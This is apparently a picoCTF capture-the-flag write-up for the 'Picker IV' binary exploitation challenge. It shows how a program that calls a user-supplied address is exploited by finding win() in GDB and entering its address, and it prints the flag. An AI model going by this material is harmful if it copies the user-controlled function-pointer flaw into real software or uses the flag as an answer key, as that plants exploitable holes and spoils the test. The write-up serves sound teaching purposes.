# Picker IV

**Category:** Binary Exploitation
**Difficulty:** Medium
**Author:** LT 'syreal' Jones

## Challenge Description

This challenge gives us both the source code and the compiled binary.

The program asks the user to enter a hexadecimal address, then jumps directly to that address:

```c
unsigned int val;

printf("Enter the address in hex to jump to, excluding '0x': ");
scanf("%x", &val);

void (*foo)(void) = (void (*)())val;
foo();
```

After reading this part, the goal was immediately clear: find the address of `win()` and provide that address to the program.

## Finding the `win` Address

The source code already contains a `win()` function:

```c
int win() {
    FILE *fptr;
    char c;

    printf("You won!\n");

    fptr = fopen("flag.txt", "r");

    if (fptr == NULL) {
        printf("Cannot open file.\n");
        exit(0);
    }

    c = fgetc(fptr);

    while (c != EOF) {
        printf("%c", c);
        c = fgetc(fptr);
    }

    printf("\n");
    fclose(fptr);
}
```

So instead of trying to exploit memory corruption, I only needed to find where this function was located in the binary.

I opened the binary in GDB and checked the function:

```text
(gdb) disas win
```

The disassembly showed:

```asm
0x000000000040129e <+0>:     endbr64
0x00000000004012a2 <+4>:     push   rbp
0x00000000004012a3 <+5>:     mov    rbp,rsp
0x00000000004012a6 <+8>:     sub    rsp,0x10
0x00000000004012aa <+12>:    lea    rdi,[rip+0xd74]
```

The actual entry address of `win()` is therefore:

```text
0x40129e
```

I then connected to the remote instance and entered the address:

```text
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```

## A Small GDB Detail

One thing I noticed while testing was that:

```text
(gdb) b win
```

placed the breakpoint at:

```text
0x4012aa <win+12>
```

instead of the first instruction at:

```text
0x40129e <win+0>
```

The first few instructions are the function prologue:

```asm
endbr64
push rbp
mov rbp,rsp
sub rsp,0x10
```

Interestingly, jumping directly to `0x4012aa` also worked in this challenge and still printed the flag.

However, this should not be considered a reliable entry point. Jumping to `0x4012aa` skips the function prologue, while later instructions in `win()` still use stack variables such as `[rbp-0x10]`.

So even though it happened to work here, the correct address to use is still the real function entry:

```text
0x40129e
```

## What the Vulnerability Is

The main issue is this code:

```c
void (*foo)(void) = (void (*)())val;
foo();
```

`val` comes directly from user input.

The program casts this integer into a function pointer and immediately calls it. This gives the user direct control over the program's instruction pointer.

In this case, we can simply point it at `win()`.

This was also a useful introduction to function pointers in C. A function pointer stores the address of executable code, and calling the pointer transfers execution to that address.

The dangerous part here is that the address is completely controlled by the user.

## Conclusion

This challenge was straightforward because the program directly asks for an address and then executes it.

The solution is simply:

```text
win address = 0x40129e
```

Then send:

```text
40129e
```

to the remote service.

Even though the challenge was short, it was useful for understanding how function addresses, function pointers, and indirect calls work at the binary level.

## Flag

```text
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```
